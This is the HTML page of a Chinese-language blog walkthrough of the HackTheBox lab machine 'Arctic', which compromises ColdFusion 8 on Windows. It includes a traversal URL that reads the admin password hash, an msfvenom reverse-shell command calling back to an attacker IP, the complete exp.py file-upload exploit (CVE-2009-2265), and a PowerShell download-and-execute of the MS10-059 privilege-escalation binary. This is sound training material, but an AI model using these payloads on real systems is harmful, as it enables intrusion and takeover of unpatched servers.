@@ -1,0 +1,700 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>Arctic - HackTheBox | 喵喵喵喵 | 某鱼唇的人类</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#66CCFF">
+    
+    
+    <meta name="keywords" content="HackTheBox">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;9  10.10.10.11                                                                                                              端口扫描1234567891011121314">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Arctic - HackTheBox">
+<meta property="og:url" content="https://darkwing.moe/2020/02/02/Arctic-HackTheBox/index.html">
+<meta property="og:site_name" content="喵喵喵喵">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;9  10.10.10.11                                                                                                              端口扫描1234567891011121314">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122201.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122202.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122203.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122204.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122205.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122206.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122207.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122208.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122209.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122210.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122211.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122212.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122213.jpg">
+<meta property="article:published_time" content="2020-02-02T07:02:36.000Z">
+<meta property="article:modified_time" content="2020-12-22T07:03:58.665Z">
+<meta property="article:author" content="暗羽">
+<meta property="article:tag" content="HackTheBox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122201.jpg">
+    
+        <link rel="alternate" type="application/atom+xml" title="喵喵喵喵" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">暗羽</h5>
+          <a href="mailto:1126955201@qq.com" title="1126955201@qq.com" class="mail">1126955201@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/zjicmDarkWing" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://www.weibo.com/zjicmDarkWing" target="_blank" >
+                <i class="icon icon-lg icon-weibo"></i>
+                Weibo
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://twitter.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-gratipay"></i>
+                彼女募集中
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://darkwing.moe/2015/01/01/%E4%B9%A6%E5%8D%95/"  >
+                <i class="icon icon-lg icon-link"></i>
+                一些链接
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Arctic - HackTheBox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="検索">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Arctic - HackTheBox</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2020-02-02T07:02:36.000Z" itemprop="datePublished" class="page-time">
+  2020-02-02
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#基本信息"><span class="post-toc-number">1.</span> <span class="post-toc-text">基本信息</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#10-10-10-11"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">10.10.10.11</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#端口扫描"><span class="post-toc-number">2.</span> <span class="post-toc-text">端口扫描</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#8500"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">8500</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#ColdFusion"><span class="post-toc-number">3.</span> <span class="post-toc-text">ColdFusion</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#任意文件读取"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">任意文件读取</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#任意文件上传-rce"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">任意文件上传&#x2F;rce</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#exp-py"><span class="post-toc-number">3.3.</span> <span class="post-toc-text">exp.py</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#user-flag"><span class="post-toc-number">4.</span> <span class="post-toc-text">user flag</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#提权信息"><span class="post-toc-number">5.</span> <span class="post-toc-text">提权信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#提权"><span class="post-toc-number">6.</span> <span class="post-toc-text">提权</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#root-flag"><span class="post-toc-number">7.</span> <span class="post-toc-text">root flag</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#参考资料"><span class="post-toc-number">8.</span> <span class="post-toc-text">参考资料</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Arctic-HackTheBox"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Arctic - HackTheBox</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2020-02-02 15:02:36" datetime="2020-02-02T07:02:36.000Z"  itemprop="datePublished">2020-02-02</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><ul>
+<li><p><a href="https://www.hackthebox.eu/home/machines/profile/9" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/profile/9</a></p>
+</li>
+<li><h2 id="10-10-10-11"><a href="#10-10-10-11" class="headerlink" title="10.10.10.11"></a>10.10.10.11</h2></li>
+</ul>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122201.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV -Pn 10.10.10.11</span></span><br><span class="line">Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-22 13:58 CST</span><br><span class="line">Nmap scan report for 10.10.10.11</span><br><span class="line">Host is up (0.068s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">135/tcp   open  msrpc   Microsoft Windows RPC</span><br><span class="line">8500/tcp  open  fmtp?</span><br><span class="line">49154/tcp open  msrpc   Microsoft Windows RPC</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 224.15 seconds</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="8500"><a href="#8500" class="headerlink" title="8500"></a>8500</h2><p>直接访问是两个目录，/CFIDE/administrator目录是登录页面，根据页面信息是ColdFusion 8：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122202.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122203.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="ColdFusion"><a href="#ColdFusion" class="headerlink" title="ColdFusion"></a>ColdFusion</h1><p>这个版本的ColdFusion有两种打法，一个是直接未授权上传jsp后去访问出发shell，另一种是任意文件读取拿到密码hash后解出来密码，登录进去上传shell：</p>
+<ul>
+<li>Adobe ColdFusion - Directory Traversal - Multiple remote Exploit<br><a href="https://www.exploit-db.com/exploits/14641" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/14641</a></li>
+<li>ColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit) - CFM webapps Exploit<br><a href="https://www.exploit-db.com/exploits/16788" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/16788</a></li>
+</ul>
+<h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h2><ul>
+<li><a href="http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en" target="_blank" rel="noopener">http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en</a></li>
+</ul>
+<p>读取出密码hash，解出来密码,用户名就是admin：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122204.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122205.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>另外如果解不出来明文密码，也可以直接使用hash生成登录用hash：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hex_hmac_sha1(<span class="built_in">document</span>.loginform.salt.value, <span class="string">'2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03'</span>);</span><br></pre></td></tr></table></figure>
+
+<p>登录进去,add new scheduled/task那里可以上传jsp，然后再去前面的目录里找到上传的文件访问触发(网页加载太慢了，用另一种方式打了)：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122206.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="任意文件上传-rce"><a href="#任意文件上传-rce" class="headerlink" title="任意文件上传/rce"></a>任意文件上传/rce</h2><p>论坛里给了脚本：</p>
+<ul>
+<li><a href="https://forum.hackthebox.eu/discussion/116/python-coldfusion-8-0-1-arbitrary-file-upload" target="_blank" rel="noopener">https://forum.hackthebox.eu/discussion/116/python-coldfusion-8-0-1-arbitrary-file-upload</a></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java&#x2F;jsp_shell_reverse_tcp lhost&#x3D;10.10.14.6 lport&#x3D;4445 -f raw &gt; miao.jsp</span><br><span class="line"></span><br><span class="line">$ python exp.py 10.10.10.11 8500 .&#x2F;miao.jsp</span><br><span class="line">Sending payload...</span><br><span class="line">Successfully uploaded payload!</span><br><span class="line">Find it at http:&#x2F;&#x2F;10.10.10.11:8500&#x2F;userfiles&#x2F;file&#x2F;exploit.jsp</span><br></pre></td></tr></table></figure>
+
+<p> 然后去访问触发，getshell：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122207.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Exploit Title: ColdFusion 8.0.1 - Arbitrary File Upload</span></span><br><span class="line"><span class="comment"># Date: 2017-10-16</span></span><br><span class="line"><span class="comment"># Exploit Author: Alexander Reid</span></span><br><span class="line"><span class="comment"># Vendor Homepage: http://www.adobe.com/products/coldfusion-family.html</span></span><br><span class="line"><span class="comment"># Version: ColdFusion 8.0.1</span></span><br><span class="line"><span class="comment"># CVE: CVE-2009-2265</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Description:</span></span><br><span class="line"><span class="comment"># A standalone proof of concept that demonstrates an arbitrary file upload vulnerability in ColdFusion 8.0.1</span></span><br><span class="line"><span class="comment"># Uploads the specified jsp file to the remote server.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Usage: ./exploit.py &lt;target ip&gt; &lt;target port&gt; [/path/to/coldfusion] &lt;/path/to/payload.jsp&gt;</span></span><br><span class="line"><span class="comment"># Example: ./exploit.py 127.0.0.1 8500 /home/arrexel/shell.jsp</span></span><br><span class="line"><span class="keyword">import</span> requests, sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    ip = sys.argv[<span class="number">1</span>]</span><br><span class="line">    port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">5</span>:</span><br><span class="line">        path = sys.argv[<span class="number">3</span>]</span><br><span class="line">        <span class="keyword">with</span> open(sys.argv[<span class="number">4</span>], <span class="string">'r'</span>) <span class="keyword">as</span> payload:</span><br><span class="line">            body=payload.read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        path = <span class="string">""</span></span><br><span class="line">        <span class="keyword">with</span> open(sys.argv[<span class="number">3</span>], <span class="string">'r'</span>) <span class="keyword">as</span> payload:</span><br><span class="line">            body=payload.read()</span><br><span class="line"><span class="keyword">except</span> IndexError:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Usage: ./exploit.py &lt;target ip/hostname&gt; &lt;target port&gt; [/path/to/coldfusion] &lt;/path/to/payload.jsp&gt;'</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Example: ./exploit.py example.com 8500 /home/arrexel/shell.jsp'</span></span><br><span class="line">    sys.exit(<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line">basepath = <span class="string">"http://"</span> + ip + <span class="string">":"</span> + port + path</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Sending payload...'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    req = requests.post(basepath + <span class="string">"/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&amp;Type=File&amp;CurrentFolder=/exploit.jsp%00"</span>, files=&#123;<span class="string">'newfile'</span>: (<span class="string">'exploit.txt'</span>, body, <span class="string">'application/x-java-archive'</span>)&#125;, timeout=<span class="number">30</span>)</span><br><span class="line">    <span class="keyword">if</span> req.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Successfully uploaded payload!\nFind it at '</span> + basepath + <span class="string">'/userfiles/file/exploit.jsp'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Failed to upload payload... '</span> + str(req.status_code) + <span class="string">' '</span> + req.reason</span><br><span class="line"><span class="keyword">except</span> requests.Timeout:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Failed to upload payload... Request timed out'</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>当前shell用户桌面得到user.txt:</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122208.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>直接根据systeminfo信息分析提权建议，给出很多，这里选择10-059:</p>
+<ul>
+<li><a href="https://github.com/egre55/windows-kernel-exploits/blob/master/MS10-059:%20Chimichurri/Compiled/Chimichurri.exe" target="_blank" rel="noopener">https://github.com/egre55/windows-kernel-exploits/blob/master/MS10-059:%20Chimichurri/Compiled/Chimichurri.exe</a></li>
+</ul>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122209.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>就是把exp传上去执行(直接加载meterpreter然后执行提权模块的话非常快)：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="variable">$webclient</span> = <span class="built_in">New-Object</span> System.Net.WebClient &gt;&gt;miao.ps1</span><br><span class="line">echo <span class="variable">$url</span> = <span class="string">"http://10.10.14.6:7777/Chimichurri.exe"</span> &gt;&gt;miao.ps1</span><br><span class="line">echo <span class="variable">$file</span> = <span class="string">"exploit.exe"</span> &gt;&gt;miao.ps1</span><br><span class="line">echo <span class="variable">$webclient</span>.DownloadFile(<span class="variable">$url</span>,<span class="variable">$file</span>) &gt;&gt;miao.ps1</span><br><span class="line">powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File miao.ps1</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122210.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122211.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122212.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h1><p>然后直接Administrator用户桌面得到root.txt:</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122213.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
+<li>Adobe ColdFusion - Directory Traversal - Multiple remote Exploit<br><a href="https://www.exploit-db.com/exploits/14641" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/14641</a></li>
+<li>ColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit) - CFM webapps Exploit<br><a href="https://www.exploit-db.com/exploits/16788" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/16788</a></li>
+<li><a href="https://forum.hackthebox.eu/discussion/116/python-coldfusion-8-0-1-arbitrary-file-upload" target="_blank" rel="noopener">https://forum.hackthebox.eu/discussion/116/python-coldfusion-8-0-1-arbitrary-file-upload</a></li>
+<li><a href="https://github.com/egre55/windows-kernel-exploits/blob/master/MS10-059:%20Chimichurri/Compiled/Chimichurri.exe" target="_blank" rel="noopener">https://github.com/egre55/windows-kernel-exploits/blob/master/MS10-059:%20Chimichurri/Compiled/Chimichurri.exe</a></li>
+<li><a href="https://www.hackthebox.eu/home/machines/writeup/9" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/writeup/9</a></li>
+<li>HTB: Arctic | 0xdf hacks stuff<br><a href="https://0xdf.gitlab.io/2020/05/19/htb-arctic.html#priv-tolis--system" target="_blank" rel="noopener">https://0xdf.gitlab.io/2020/05/19/htb-arctic.html#priv-tolis--system</a></li>
+<li>HackTheBox - Arctic - YouTube<br><a href="https://www.youtube.com/watch?v=e9lVyFH7-4o&amp;feature=youtu.be&amp;ab_channel=IppSec" target="_blank" rel="noopener">https://www.youtube.com/watch?v=e9lVyFH7-4o&amp;feature=youtu.be&amp;ab_channel=IppSec</a></li>
+</ul>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最終更新：<time datetime="2020-12-22T07:03:58.665Z" itemprop="dateUpdated">2020-12-22 15:03:58</time>
+</span><br>
+
+
+        
+        水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
+        
+    </div>
+    
+    <footer>
+        <a href="https://darkwing.moe">
+            <img src="/img/avatar.jpg" alt="暗羽">
+            暗羽
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HackTheBox/" rel="tag">HackTheBox</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2020/02/02/Arctic-HackTheBox/&title=《Arctic - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2020/02/02/Arctic-HackTheBox/&title=《Arctic - HackTheBox》 — 喵喵喵喵&source=安全研究，彼女募集中" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2020/02/02/Arctic-HackTheBox/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Arctic - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2020/02/02/Arctic-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2020/02/02/Arctic-HackTheBox/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2020/03/03/Warmup-HCTF-2018/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">Warmup - HCTF 2018</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2020/01/31/Bastard-HackTheBox/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Bastard - HackTheBox</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'd35074a248599729ad26',
